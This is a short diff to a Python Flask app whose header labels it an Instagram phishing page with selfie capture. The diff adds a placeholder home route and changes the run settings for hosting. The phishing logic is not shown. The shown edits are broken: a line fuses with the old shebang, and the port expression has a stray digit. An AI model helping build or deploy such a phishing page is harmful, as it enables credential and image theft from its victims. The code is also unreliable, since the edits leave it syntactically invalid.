@@ -1,4 +1,13 @@
-#!/usr/bin/env python3
+from flask import Flask
+
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return 'الصفحة الرئيسية شغالة ✅'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=10000)#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # INSTAGRAM PHISHING PAGE WITH SELFIE CAPTURE
 # EDUCATIONAL PURPOSES ONLY - UNAUTHORIZED ACCESS IS ILLEGAL
@@ -311,4 +320,4 @@ def dashboard():
 
 if __name__ == '__main__':
     init_db()
-    app.run(host='0.0.0.0', port=8080, debug=True)
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000))0, debug=True)
